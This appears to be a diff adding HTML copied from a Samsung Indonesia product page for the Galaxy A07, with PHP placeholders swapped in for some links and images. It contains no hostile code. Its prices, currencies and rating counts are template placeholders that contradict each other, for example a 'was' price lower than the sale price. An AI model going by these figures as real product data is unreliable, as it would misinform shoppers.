+         <input id="featureAnchorListYn" name="featureAnchorListYn" type="hidden" value="N"/>
+         <ul class="tab__list" id="anchor-menu-list" role="tablist">
+          <li class="tab__item" id="benefitWrap" role="presentation" style="display: none; margin-left: 0;">
+           <a an-ac="anchor navi" an-ca="navigation" an-la="anchor navi:features" an-tr="pdd39_anchor nav v3-product detail-sub navi-navigation" aria-label="Fitur" class="tab__item-title" href="#features">
+            Fitur
+            <span class="tab__item-line">
+            </span>
+           </a>
+          </li>
+         </ul>
+         <div class="tab__right-arrow-wrap disabled">
+          <button aria-label="next" class="tab__right-arrow" role="button" type="button">
+           <svg aria-hidden="true" class="icon" focusable="false">
+            <use href="#next-regular" xlink:href="#next-regular">
+            </use>
+           </svg>
+          </button>
+         </div>
+        </div>
+       </div>
+      </div>
+      <div class="pdd39-anchor-nav__header-dummy">
+      </div>
+     </div>
+     <div class="sg-component" id="navProperties" style="display:none;">
+      <input id="navPriceDisplayYn" type="hidden" value="Y"/>
+      <input id="navShopServiceYn" type="hidden"/>
+      <input id="navPackageYn" type="hidden" value="N"/>
+      <input id="thirdPartyPrdYN" type="hidden" value="N"/>
+      <input id="tenantId" type="hidden" value="idn"/>
+      <input id="pdType" type="hidden" value="S-B"/>
+      <input id="navOldProductYn" type="hidden" value="N"/>
+      <input id="shopSKU" type="hidden" value="MS-F813QBDUIDZ"/>
+      <input id="wtbUseYn" type="hidden" value="N"/>
+      <input id="pdpUrl" type="hidden" value="/id/smartphones/galaxy-a/galaxy-a07-black-64gb-sm-a075fzkdxid/"/>
+      <input id="ctaType" type="hidden" value="INSTOCK"/>
+      <input id="marketingPdpYN" type="hidden" value="N"/>
+      <input id="familyCode" type="hidden" value="561454"/>
+      <input id="tellsomeYn" type="hidden" value="N"/>
+      <input id="navDisplayName" type="hidden" value="Galaxy A07"/>
+      <input id="navPageTrack" type="hidden" value="product detail"/>
+      <input id="current-page-nav" name="current-page-nav" type="hidden" value="/content/samsung/id/smartphones/galaxy-a/galaxy-a07-black-64gb-sm-a075fzkdxid/buy"/>
+      <input id="navConfiguratorUrl" type="hidden"/>
+      <input id="navCtaLocalText" type="hidden"/>
+      <input id="navCtaEngText" type="hidden"/>
+      <input id="navConfiguratorUseYn" type="hidden" value="N"/>
+      <input id="navDetailRootNodePath" type="hidden" value="/id/smartphones/galaxy-a/galaxy-a07-black-64gb-sm-a075fzkdxid/buy.dynamic"/>
+     </div>
+    </div>
+    <div class="pd-g-product-detail-header-ux2">
+     <div class="add-ons-evoucher-popup" style="display:none">
+      <div class="layer-popup" id="freeGiftPopup" role="dialog" style="display:block" tabindex="0">
+       <div class="layer-popup__inner">
+        <div class="layer-popup__contents scrollbar">
+         <div class="add-ons-evoucher-popup__contents scrollbar__contents">
+          <div class="add-ons-evoucher-popup__wrap">
+           <div class="add-ons-evoucher-popup__head">
+            <h2 class="layer-popup__title">
+            </h2>
+           </div>
+           <div class="add-ons-evoucher-popup__body">
+            <ul class="add-ons-evoucher-popup__list">
+            </ul>
+           </div>
+          </div>
+         </div>
+        </div>
+        <div class="add-ons-evoucher-popup__button">
+         <div class="add-ons-evoucher-popup__button-item">
+          <button aria-disabled="true" aria-label="Out of Stock" class="cta cta--contained cta--black cta--disabled">
+           Out of Stock
+          </button>
+         </div>
+        </div>
+        <button class="layer-popup__close" type="button">
+         <span class="hidden">
+          Tutup Layar Popup
+         </span>
+         <svg class="icon" focusable="false">
+          <use href="#delete-bold" xlink:href="#delete-bold">
+          </use>
+         </svg>
+        </button>
+       </div>
+      </div>
+     </div>
+     <!-- <div class="component-area" style=""> -->
+     <section class="pdd16-step-buying" id="pdd16-step-buying" style="display:none;">
+      <div class="pdd16-step-buying__header">
+       <div class="pdd16-step-buying__header-wrap">
+        <div class="pdd16-step-buying__header-title">
+         <div class="image">
+          <img class="image__preview lazy-load responsive-img" data-desktop-src="//images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603128?$240_240_PNG$" data-mobile-src="//images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603128?$240_240_PNG$"/>
+          <img class="image__main lazy-load responsive-img" data-desktop-src="//images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603128?$240_240_PNG$" data-mobile-src="//images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603128?$240_240_PNG$"/>
+         </div>
+         <div class="pdd16-step-buying__header-text">
+          <strong>
+           Galaxy A07
+          </strong>
+          <!-- <div class="pdd16-step-buying__tooltip">Galaxy A07</div> -->
+         </div>
+         <div class="pdd16-step-buying__quantity">
+          <strong>
+          </strong>
+         </div>
+        </div>
+        <div aria-live="polite" class="pdd16-step-buying__add-on-list swiper-container basic-swiper" data-swiper-option='{
+            "componentEl":".pdd16-step-buying__add-on-list",
+            "keepWrapper": true,
+            "offSlideAccessibility":true,
+            "followFinger": false,
+            "slidesPerView":"auto"
+          }' style="display:none;">
+         <button class="swiper-button-prev" type="button">
+          <span class="hidden">
+           Previous
+          </span>
+          <svg aria-hidden="true" class="icon" focusable="false">
+           <use href="#previous-regular" xlink:href="#previous-regular">
+           </use>
+          </svg>
+         </button>
+         <div class="swiper-wrapper" role="list">
+         </div>
+         <button class="swiper-button-next" type="button">
+          <span class="hidden">
+           Next
+          </span>
+          <svg aria-hidden="true" class="icon" focusable="false">
+           <use href="#next-regular" xlink:href="#next-regular">
+           </use>
+          </svg>
+         </button>
+        </div>
+        <!-- (2022.08.11 수정) p.pdd16-step-buying__header-price-text => div 태그로 수정 -->
+        <div class="pdd16-step-buying__header-price">
+         <div class="pdd16-step-buying__header-price-text">
+          <strong>
+           from &pound;55.53/mo for 36 mos
+          </strong>
+          or &pound;3,299.00
+          <!-- (2022.08.11 수정) Was Price, Save Price 있는 경우 .pdd16-step-buying__header-price-save 추가 -->
+          <div class="pdd16-step-buying__header-price-save">
+           <del class="was-text">
+            &pound;2,399.00
+           </del>
+           <span class="sale-text">
+            save $ &pound;400.00
+           </span>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+      <div class="pdd16-step-buying__header__dummy">
+      </div>
+      <!-- (2022.08.11 수정) .pdd16-step-buying__promotion-banner 추가 -->
+      <div class="pdd16-step-buying__promotion-banner">
+       <svg class="icon" focusable="false">
+        <use href="#deal-bold" xlink:href="#deal-bold">
+        </use>
+       </svg>
+       <p class="pdd16-step-buying__promotion-banner-text">
+       </p>
+      </div>
+      <div class="pdd16-step-buying__contents">
+       <p class="pdd16-step-buying__headline">
+        Tambahan Menarik Lainnya
+       </p>
+       <h3 class="pdd16-step-buying__sub-headline" style="display:none;">
+       </h3>
+       <div class="pdd16-step-buying__evoucher" style="display:none;">
+        <div class="pdd16-step-buying__evoucher-wrap">
+         <ul class="pdd16-step-buying__evoucher-list">
+          <li class="pdd16-step-buying__evoucher-item">
+           <span class="pdd16-step-buying__evoucher-title">
+            Selected Items(
+            <span>
+            </span>
+            )
+           </span>
+           <p class="pdd16-step-buying__evoucher-content" id="selectedItem">
+           </p>
+           <input id="voucherTotal" type="hidden" value="0"/>
+          </li>
+          <li class="pdd16-step-buying__evoucher-item">
+           <span class="pdd16-step-buying__evoucher-title">
+            Saldo eVoucher saya
+           </span>
+           <p class="pdd16-step-buying__evoucher-content" id="voucherBalance">
+           </p>
+          </li>
+          <li class="pdd16-step-buying__evoucher-item">
+           <span class="pdd16-step-buying__evoucher-title">
+            Biaya Tambahan
+           </span>
+           <p class="pdd16-step-buying__evoucher-content" id="voucherCharge">
+           </p>
+          </li>
+         </ul>
+        </div>
+        <div class="pdd16-step-buying__evoucher-cta">
+         <button aria-label="Clear All" class="cta cta--underline cta--black cta--icon cta--clear-all">
+          Clear All
+          <svg class="icon" focusable="false">
+           <use href="#delete-bold" xlink:href="#delete-bold">
+           </use>
+          </svg>
+         </button>
+        </div>
+       </div>
+       <div class="pdd16-step-buying__tab-wrap">
+        <div class="tab bg-light-gray" data-use-arrow="">
+         <div class="tab__left-arrow-wrap disabled">
+          <button aria-label="previous" class="tab__left-arrow" role="button" type="button">
+           <svg aria-hidden="true" class="icon" focusable="false">
+            <use href="#previous-regular" xlink:href="#previous-regular">
+            </use>
+           </svg>
+          </button>
+         </div>
+         <ul class="tab__list" role="tablist">
+          <li class="tab__item" role="presentation">
+           <button class="tab__item-title" role="tab">
+            <span class="tab__item-line">
+            </span>
+           </button>
+          </li>
+          <li class="tab__item" role="presentation">
+           <button class="tab__item-title" role="tab">
+            <span class="tab__item-line">
+            </span>
+           </button>
+          </li>
+          <li class="tab__item" role="presentation">
+           <button class="tab__item-title" role="tab">
+            <span class="tab__item-line">
+            </span>
+           </button>
+          </li>
+         </ul>
+         <div class="tab__right-arrow-wrap disabled">
+          <button aria-label="next" class="tab__right-arrow" role="button" type="button">
+           <svg aria-hidden="true" class="icon" focusable="false">
+            <use href="#next-regular" xlink:href="#next-regular">
+            </use>
+           </svg>
+          </button>
+         </div>
+        </div>
+        <div aria-live="polite" class="pdd16-step-buying__card-wrap swiper-container basic-swiper" data-swiper-option='{
+          "slidesPerView":1,
+          "autoHeight":true,
+          "pagination":false,
+          "componentEl":".pdd16-step-buying__card-wrap",
+          "watchOverflow":true,
+          "offTxtAccesibility":"true"
+          }'>
+         <div class="swiper-wrapper">
+          <div class="pdd16-step-buying__tab pdd16-step-buying__2column swiper-slide">
+           <div class="pdd16-step-buying__list-type">
+            <a aria-label="2column" class="btn-type on">
+             <svg class="icon" focusable="false" viewbox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+              <path d="M0 0H16V16H0z" fill="none" transform="translate(-344 -388) translate(344 388)">
+              </path>
+              <g>
+               <path d="M.764 0h3.822a.764.764 0 0 1 .764.764v3.822a.764.764 0 0 1-.764.764H.764A.764.764 0 0 1 0 4.586V.764A.764.764 0 0 1 .764 0z" transform="translate(-344 -388) translate(2 2) translate(344 388)">
+               </path>
+               <path d="M.764 0h3.822a.764.764 0 0 1 .764.764v3.822a.764.764 0 0 1-.764.764H.764A.764.764 0 0 1 0 4.586V.764A.764.764 0 0 1 .764 0z" transform="translate(-344 -388) translate(2 2) translate(344 394.649)">
+               </path>
+               <path d="M.764 0h3.822a.764.764 0 0 1 .764.764v3.822a.764.764 0 0 1-.764.764H.764A.764.764 0 0 1 0 4.586V.764A.764.764 0 0 1 .764 0z" transform="translate(-344 -388) translate(2 2) translate(350.65 388)">
+               </path>
+               <path d="M.764 0h3.822a.764.764 0 0 1 .764.764v3.822a.764.764 0 0 1-.764.764H.764A.764.764 0 0 1 0 4.586V.764A.764.764 0 0 1 .764 0z" transform="translate(-344 -388) translate(2 2) translate(350.65 394.649)">
+               </path>
+              </g>
+             </svg>
+            </a>
+            <a aria-label="1column" class="btn-type">
+             <svg class="icon" focusable="false" viewbox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+              <path d="M0 0H16V16H0z" fill="none" transform="translate(349 388) translate(-349 -388)">
+              </path>
+              <g>
+               <path class="cls-2" d="M.652 0h10.7A.681.681 0 0 1 12 .764v3.822a.681.681 0 0 1-.652.764H.652A.681.681 0 0 1 0 4.586V.764A.681.681 0 0 1 .652 0z" transform="translate(344 388.732) translate(7 1.268) translate(-349 -388)">
+               </path>
+               <path class="cls-2" d="M.652 0h10.7A.681.681 0 0 1 12 .764v3.822a.681.681 0 0 1-.652.764H.652A.681.681 0 0 1 0 4.586V.764A.681.681 0 0 1 .652 0z" transform="translate(344 395.732) translate(7 1.268) translate(-349 -388)">
+               </path>
+              </g>
+             </svg>
+            </a>
+           </div>
+           <div class="scrollbar">
+            <div class="scrollbar__contents">
+             <div class="pdd16-step-buying__view-more">
+              <button aira-label="View more" class="cta" type="button">
+               <svg class="icon next" focusable="false">
+                <use href="#next-bold" xlink:href="#next-bold">
+                </use>
+               </svg>
+               <span class="cta-text">
+                Lihat selengkapnya
+               </span>
+               <svg class="icon down" focusable="false">
+                <use href="#open-down-bold" xlink:href="#open-down-bold">
+                </use>
+               </svg>
+              </button>
+             </div>
+            </div>
+           </div>
+          </div>
+         </div>
+         <div class="pdd16-step-buying__disclaimer" style="display:none">
+          <p>
+          </p>
+         </div>
+         <div class="pdd16-step-buying__footer pdd16-step-buying__footer--fixed">
+          <div class="pdd16-step-buying__footer-price">
+           <p class="pdd16-step-buying__footer-text">
+            <strong>
+             Total
+            </strong>
+            VAT Inclusive
+           </p>
+           <p class="pdd16-step-buying__footer-sum">
+            <strong>
+             From $107.50/mo
+            </strong>
+            for most at 0% APR
+            <br/>
+            or $2,579.96
+           </p>
+          </div>
+         </div>
+         <div class="pdd16-step-buying__footer__dummy">
+         </div>
+        </div>
+       </div>
+      </div>
+      <div aria-modal="true" class="pdd16-step-buying__layer-learn-more" id="layerPopupLearnMore" role="dialog" tabindex="0">
+       <div class="layer-popup">
+        <div class="layer-popup__inner">
+         <h2 class="layer-popup__title">
+         </h2>
+         <div class="layer-popup__contents scrollbar">
+          <div class="scrollbar__contents">
+           <div class="pdd16-step-buying__learn-more-images">
+           </div>
+           <div class="pdd16-step-buying__learn-more-content">
+           </div>
+          </div>
+         </div>
+         <button class="layer-popup__close" type="button">
+          <span class="hidden">
+           Layer Popup Close
+          </span>
+          <svg aria-hidden="true" class="icon" focusable="false">
+           <use href="#delete-bold" xlink:href="#delete-bold">
+           </use>
+          </svg>
+         </button>
+        </div>
+       </div>
+      </div>
+     </section>
+     <!--  </div> -->
+     <div class="add-ons-evoucher-popup" style="display:none">
+      <div class="layer-popup" id="freeGiftPopup" role="dialog" style="display:block" tabindex="0">
+       <div class="layer-popup__inner">
+        <div class="layer-popup__contents scrollbar">
+         <div class="add-ons-evoucher-popup__contents scrollbar__contents">
+          <div class="add-ons-evoucher-popup__wrap">
+           <div class="add-ons-evoucher-popup__head">
+            <h2 class="layer-popup__title">
+            </h2>
+           </div>
+           <div class="add-ons-evoucher-popup__body">
+            <ul class="add-ons-evoucher-popup__list">
+            </ul>
+           </div>
+          </div>
+         </div>
+        </div>
+        <div class="add-ons-evoucher-popup__button">
+         <div class="add-ons-evoucher-popup__button-item">
+          <button aria-disabled="true" aria-label="Out of Stock" class="cta cta--contained cta--black cta--disabled">
+           Out of Stock
+          </button>
+         </div>
+        </div>
+        <button class="layer-popup__close" type="button">
+         <span class="hidden">
+          Tutup Layar Popup
+         </span>
+         <svg class="icon" focusable="false">
+          <use href="#delete-bold" xlink:href="#delete-bold">
+          </use>
+         </svg>
+        </button>
+       </div>
+      </div>
+     </div>
+     <section class="pdd16-step-buying-v2 pdd16-step-buying-v2--add-ons" id="pdd16-step-buying-v2" style="display:none;">
+      <div class="pdd16-step-buying-v2__contents">
+       <h2 class="pdd16-step-buying-v2__headline">
+       </h2>
+       <h3 class="pdd16-step-buying-v2__sub-headline">
+       </h3>
+       <div class="pdd16-step-buying-v2__category-list">
+       </div>
+      </div>
+      <div class="pdd16-step-buying-v2__footer">
+       <button class="pdd16-step-buying-v2__footer-cta addon cta--skip">
+        Lewatkan
+       </button>
+      </div>
+      <div class="pdd16-step-buying-v2__bottom-wrap">
+       <div class="pdd16-step-buying-v2__bottom">
+        <div class="pdd16-step-buying-v2__evoucher" style="display: none;">
+         <div class="pdd16-step-buying-v2__evoucher-wrap">
+          <ul class="pdd16-step-buying-v2__evoucher-list">
+           <li class="pdd16-step-buying-v2__evoucher-item">
+            <span class="pdd16-step-buying-v2__evoucher-title">
+             Selected Items(
+             <span>
+             </span>
+             )
+            </span>
+            <p class="pdd16-step-buying-v2__evoucher-content" id="selectedItem2">
+            </p>
+            <input id="voucherTotal2" type="hidden" value="0"/>
+           </li>
+           <li class="pdd16-step-buying-v2__evoucher-item">
+            <span class="pdd16-step-buying-v2__evoucher-title">
+             Saldo eVoucher saya
+            </span>
+            <p class="pdd16-step-buying-v2__evoucher-content" id="voucherBalance2">
+            </p>
+           </li>
+           <li class="pdd16-step-buying-v2__evoucher-item">
+            <span class="pdd16-step-buying-v2__evoucher-title">
+             Biaya Tambahan
+            </span>
+            <p class="pdd16-step-buying-v2__evoucher-content" id="voucherCharge2">
+            </p>
+           </li>
+          </ul>
+         </div>
+         <div class="pdd16-step-buying-v2__evoucher-cta">
+          <button aria-label="Clear All" class="cta cta--underline cta--black cta--icon cta--clear-all">
+           Clear All
+           <svg aria-hidden="true" class="icon" focusable="false">
+            <use href="#delete-bold" xlink:href="#delete-bold">
+            </use>
+           </svg>
+          </button>
+         </div>
+        </div>
+        <div class="pdd16-step-buying-v2__bottom-inner">
+         <p class="pdd16-step-buying-v2__bottom-headline">
+          <strong class="pdd16-step-buying-v2__bottom-headline-text">
+          </strong>
+         </p>
+         <div class="pdd16-step-buying-v2__bottom-price">
+          <div class="pdd16-step-buying-v2__bottom-price-wrap">
+           <div class="pdd16-step-buying-v2__bottom-price-inner">
+            <div class="pdd16-step-buying-v2__bottom-price-text">
+             <span class="final-text">
+              <strong>
+              </strong>
+             </span>
+             <span class="monthly-text">
+             </span>
+            </div>
+            <!-- (2022.08.11 수정) Was Price, Save Price 있는 경우 .pdd16-step-buying-v2__bottom-price-save 추가 -->
+            <div class="pdd16-step-buying-v2__bottom-price-save">
+             <del class="was-text">
+             </del>
+             <span class="sale-text">
+             </span>
+            </div>
+           </div>
+           <div class="pdd16-step-buying-v2__bottom-price__cta">
+            <a aria-label="Link Title" class="cta cta--contained cta--emphasis" href="<?= $canonical; ?>">
+             Add to cart
+            </a>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+      <!-- (2022.01.21 수정) .pdd16-step-buying-v2__layer-learn-more 추가 -->
+      <div aria-modal="true" class="pdd16-step-buying-v2__layer-learn-more" id="layerPopupLearnMore" role="dialog" tabindex="0">
+       <div class="layer-popup">
+        <div class="layer-popup__inner">
+         <h2 class="layer-popup__title">
+          Sound devices
+         </h2>
+         <div class="layer-popup__contents scrollbar">
+          <div class="scrollbar__contents">
+           <div class="pdd16-step-buying-v2__learn-more-images">
+            <div class="swiper-container basic-swiper" data-swiper-option='{
+				                      "slidesPerView":"1",
+				                      "keepWrapper":true,
+				                      "loop":false,
+				                      "pagination":false,
+				                      "componentEl":".pdd16-step-buying-v2__learn-more-images",
+				                      "offTxtAccesibility":"true",
+				                      "centeredSlides": true,
+				                      "centeredSlidesBounds": true,
+				                      "followFinger": true
+				                    }'>
+             <button class="swiper-button-prev" type="button">
+              <span class="hidden">
+               Previous
+              </span>
+              <svg aria-hidden="true" class="icon" focusable="false">
+               <use href="#previous-bold" xlink:href="#previous-bold">
+               </use>
+              </svg>
+             </button>
+             <div class="swiper-wrapper" role="list">
+              <div class="swiper-slide" role="listitem">
+               <div class="image">
+                <img alt="[D] alt text" class="image__preview lazy-load responsive-img" data-comp-name="image" data-desktop-src="https://via.placeholder.com/290x240" data-mobile-src="https://via.placeholder.com/520x400" role="img"/>
+                <img alt="[D] alt text" class="image__main lazy-load responsive-img" data-comp-name="image" data-desktop-src="https://via.placeholder.com/290x240" data-mobile-src="https://via.placeholder.com/520x400" role="img"/>
+               </div>
+              </div>
+              <div class="swiper-slide" role="listitem">
+               <div class="image">
+                <img alt="[D] alt text" class="image__preview lazy-load responsive-img" data-comp-name="image" data-desktop-src="https://via.placeholder.com/290x240" data-mobile-src="https://via.placeholder.com/520x400" role="img"/>
+                <img alt="[D] alt text" class="image__main lazy-load responsive-img" data-comp-name="image" data-desktop-src="https://via.placeholder.com/290x240" data-mobile-src="https://via.placeholder.com/520x400" role="img"/>
+               </div>
+              </div>
+              <div class="swiper-slide" role="listitem">
+               <div class="image">
+                <img alt="[D] alt text" class="image__preview lazy-load responsive-img" data-comp-name="image" data-desktop-src="https://via.placeholder.com/290x240" data-mobile-src="https://via.placeholder.com/520x400" role="img"/>
+                <img alt="[D] alt text" class="image__main lazy-load responsive-img" data-comp-name="image" data-desktop-src="https://via.placeholder.com/290x240" data-mobile-src="https://via.placeholder.com/520x400" role="img"/>
+               </div>
+              </div>
+             </div>
+             <button class="swiper-button-next" type="button">
+              <span class="hidden">
+               Next
+              </span>
+              <svg aria-hidden="true" class="icon" focusable="false">
+               <use href="#next-bold" xlink:href="#next-bold">
+               </use>
+              </svg>
+             </button>
+            </div>
+           </div>
+           <div class="pdd16-step-buying-v2__learn-more-content">
+            <h3 class="pdd16-step-buying-v2__learn-more-title">
+             HW-Q900A 7.1.2ch Samsung Q-Symphony Cinematic Dolby Atmos Q-Series Soundbar (2021)
+            </h3>
+            <div class="pdd16-step-buying-v2__learn-more-info">
+             <p class="pdd16-step-buying-v2__learn-more-sku">
+              HW-Q900A/XU
+             </p>
+             <strong class="pdd16-step-buying-v2__learn-more-seller">
+              Seller: Vyper
+             </strong>
+            </div>
+            <div class="pdd16-step-buying-v2__learn-more-review">
+             <!-- /* 전체 Empty: .rating--empty 추가 */ -->
+             <span class="rating">
+              <!-- (2021.08.23 수정) <span class="hidden">Rating</span> 삭제 -->
+              <!--  <span class="hidden">Rating</span>-->
+              <span class="rating__inner">
+               <span class="rating__star-list">
+                <span class="rating__star-item">
+                 <span class="rating__star-empty">
+                 </span>
+                 <!-- /* style="width: %;"로 적용  Full : style="width: 100%;" Half : style="width: 50%;" Empty : style="width: 0;" */ -->
+                 <span class="rating__star-filled" style="width: 100%;">
+                 </span>
+                </span>
+                <span class="rating__star-item">
+                 <span class="rating__star-empty">
+                 </span>
+                 <span class="rating__star-filled" style="width: 100%;">
+                 </span>
+                </span>
+                <span class="rating__star-item">
+                 <span class="rating__star-empty">
+                 </span>
+                 <span class="rating__star-filled" style="width: 100%;">
+                 </span>
+                </span>
+                <span class="rating__star-item">
+                 <span class="rating__star-empty">
+                 </span>
+                 <span class="rating__star-filled" style="width: 100%;">
+                 </span>
+                </span>
+                <span class="rating__star-item">
+                 <span class="rating__star-empty">
+                 </span>
+                 <span class="rating__star-filled" style="width: 50%;">
+                 </span>
+                </span>
+               </span>
+               <strong class="rating__point">
+                <span class="hidden">
+                 Product Ratings :
+                </span>
+                <span>
+                 4.7
+                </span>
+               </strong>
+               <em class="rating__review-count">
+                (
+                <span class="hidden">
+                 Number of Ratings :
+                </span>
+                <span>
+                 9,999
+                </span>
+                )
+               </em>
+              </span>
+             </span>
+            </div>
+            <ul class="pdd16-step-buying-v2__learn-more-feature" role="list">
+             <li class="pdd16-step-buying-v2__learn-more-feature-item" role="listitem">
+              7.1.2ch sound
+             </li>
+             <li class="pdd16-step-buying-v2__learn-more-feature-item" role="listitem">
+              True Dolby Atmos &amp; DTS:X
+             </li>
+             <li class="pdd16-step-buying-v2__learn-more-feature-item" role="listitem">
+              8&rdquo; Subwoofer
+             </li>
+             <li class="pdd16-step-buying-v2__learn-more-feature-item" role="listitem">
+              Samsung Q-Symphony
+             </li>
+             <li class="pdd16-step-buying-v2__learn-more-feature-item" role="listitem">
+              Alexa Built-In
+             </li>
+            </ul>
+            <div class="pdd16-step-buying-v2__learn-more-cta">
+             <a aria-label="Link Title" class="cta cta--underline cta--black cta--icon" href="<?= $canonical; ?>" target="_blank">
+              Product detail
+              <svg aria-hidden="true" class="icon" focusable="false">
+               <use href="#outlink-bold" xlink:href="#outlink-bold">
+               </use>
+              </svg>
+             </a>
+            </div>
+            <ul class="pdd16-step-buying-v2__learn-more-feature-icon">
+             <li class="pdd16-step-buying-v2__learn-more-feature-icon-item">
+              <div class="pdd16-step-buying-v2__learn-more-feature-icon-image">
+               <div class="image">
+                <img alt="[D] alt text" class="image__preview lazy-load responsive-img" data-comp-name="image" data-desktop-src="https://via.placeholder.com/64x64" data-mobile-src="https://via.placeholder.com/96x96" role="img"/>
+                <img alt="[D] alt text" class="image__main lazy-load responsive-img" data-comp-name="image" data-desktop-src="https://via.placeholder.com/64x64" data-mobile-src="https://via.placeholder.com/96x96" role="img"/>
+               </div>
+              </div>
+              <p class="pdd16-step-buying-v2__learn-more-feature-icon-text">
+               True 7.1.2ch Sound
+              </p>
+             </li>
+             <li class="pdd16-step-buying-v2__learn-more-feature-icon-item">
+              <div class="pdd16-step-buying-v2__learn-more-feature-icon-image">
+               <div class="image">
+                <img alt="[D] alt text" class="image__preview lazy-load responsive-img" data-comp-name="image" data-desktop-src="https://via.placeholder.com/64x64" data-mobile-src="https://via.placeholder.com/96x96" role="img"/>
+                <img alt="[D] alt text" class="image__main lazy-load responsive-img" data-comp-name="image" data-desktop-src="https://via.placeholder.com/64x64" data-mobile-src="https://via.placeholder.com/96x96" role="img"/>
+               </div>
+              </div>
+              <p class="pdd16-step-buying-v2__learn-more-feature-icon-text">
+               3D Object Based Sound
+              </p>
+             </li>
+             <li class="pdd16-step-buying-v2__learn-more-feature-icon-item">
+              <div class="pdd16-step-buying-v2__learn-more-feature-icon-image">
+               <div class="image">
+                <img alt="[D] alt text" class="image__preview lazy-load responsive-img" data-comp-name="image" data-desktop-src="https://via.placeholder.com/64x64" data-mobile-src="https://via.placeholder.com/96x96" role="img"/>
+                <img alt="[D] alt text" class="image__main lazy-load responsive-img" data-comp-name="image" data-desktop-src="https://via.placeholder.com/64x64" data-mobile-src="https://via.placeholder.com/96x96" role="img"/>
+               </div>
+              </div>
+              <p class="pdd16-step-buying-v2__learn-more-feature-icon-text">
+               Samsung Q-Symphony
+              </p>
+             </li>
+             <li class="pdd16-step-buying-v2__learn-more-feature-icon-item">
+              <div class="pdd16-step-buying-v2__learn-more-feature-icon-image">
+               <div class="image">
+                <img alt="[D] alt text" class="image__preview lazy-load responsive-img" data-comp-name="image" data-desktop-src="https://via.placeholder.com/64x64" data-mobile-src="https://via.placeholder.com/96x96" role="img"/>
+                <img alt="[D] alt text" class="image__main lazy-load responsive-img" data-comp-name="image" data-desktop-src="https://via.placeholder.com/64x64" data-mobile-src="https://via.placeholder.com/96x96" role="img"/>
+               </div>
+              </div>
+              <p class="pdd16-step-buying-v2__learn-more-feature-icon-text">
+               Built-In Centre Speaker
+              </p>
+             </li>
+            </ul>
+           </div>
+          </div>
+         </div>
+         <button class="layer-popup__close" type="button">
+          <span class="hidden">
+           Layer Popup Close
+          </span>
+          <svg aria-hidden="true" class="icon" focusable="false">
+           <use href="#delete-bold" xlink:href="#delete-bold">
+           </use>
+          </svg>
+         </button>
+        </div>
+       </div>
+      </div>
+     </section>
+     <div class="hdd02-pdp-header hdd02-pdp-header--ux-v2">
+      <div class="hdd02-pdp-header__product-info sg-pdh-product-info">
+       <div class="hdd02-product-info">
+        <div class="pd-info">
+         <div class="pd-info__wishlist">
+         </div>
+        </div>
+       </div>
+      </div>
+      <script type="text/javascript">
+       var spinImageNewData = {};
+      </script>
+      <div class="hdd02-pdp-header__gallery-area sg-pdh-gallery-section">
+       <div class="hdd02-pdp-header__gallery">
+        <section class="hdd02-gallery" id="pd-header-gallery">
+         <div class="hdd02-gallery__content">
+          <div class="hdd02-gallery__list basic-swiper swiper-container" data-swiper-option='{
+                        "breakpoints": {
+                          "1": {
+                            "slidesPerView": "auto",
+                            "centeredSlides": true
+                          },
+                          "768": {
+                            "slidesPerView": 1,
+                            "centeredSlides": false
+                          }
+                        },
+                        "keepWrapper": true,
+                        "viewMode": "mobile",
+                        "offTxtAccesibility": "true",
+                        "followFinger": false,
+                        "pagination": true,
+                        "componentEl": ".hdd02-gallery__content"
+                      }'>
+           <ul class="swiper-wrapper" role="list">
+            <li class="hdd02-gallery__item swiper-slide" data-type-headline="Galaxy A07 Front Black ">
+             <a an-ac="product gallery" an-ca="gallery" an-la="gallery:image" an-tr="hdd02_product info.-product detail-gallery module-gallery" class="hdd02-gallery__image" data-js-action="openPcGalleryPopup" href="javascript:void(0);">
+              <div class="image">
+               <img alt="Galaxy A07 Front Black " class="image__main lazy-load responsive-img" data-comp-name="image" data-desktop-src="<?= $image; ?>" data-mobile-src="<?= $image; ?>" role="img"/>
+              </div>
+             </a>
+            </li>
+            <li class="hdd02-gallery__item swiper-slide" data-type-headline="Galaxy A07 Back Black ">
+             <a an-ac="product gallery" an-ca="gallery" an-la="gallery:image" an-tr="hdd02_product info.-product detail-gallery module-gallery" class="hdd02-gallery__image" data-js-action="openPcGalleryPopup" href="javascript:void(0);">
+              <div class="image">
+               <img alt="Galaxy A07 Back Black " class="image__main lazy-load responsive-img" data-comp-name="image" data-desktop-src="<?= $image; ?>" data-mobile-src="<?= $image; ?>" role="img"/>
+              </div>
+             </a>
+            </li>
+            <li class="hdd02-gallery__item swiper-slide" data-type-headline="Galaxy A07 BackL30 Black ">
+             <a an-ac="product gallery" an-ca="gallery" an-la="gallery:image" an-tr="hdd02_product info.-product detail-gallery module-gallery" class="hdd02-gallery__image" data-js-action="openPcGalleryPopup" href="javascript:void(0);">
+              <div class="image">
+               <img alt="Galaxy A07 BackL30 Black " class="image__main lazy-load responsive-img" data-comp-name="image" data-desktop-src="//images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603111?$Q90_1920_1280_F_PNG$" data-mobile-src="//images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603111?$Q90_1248_936_F_PNG$" role="img"/>
+              </div>
+             </a>
+            </li>
+            <li class="hdd02-gallery__item swiper-slide" data-type-headline="Galaxy A07 BackR30 Black ">
+             <a an-ac="product gallery" an-ca="gallery" an-la="gallery:image" an-tr="hdd02_product info.-product detail-gallery module-gallery" class="hdd02-gallery__image" data-js-action="openPcGalleryPopup" href="javascript:void(0);">
+              <div class="image">
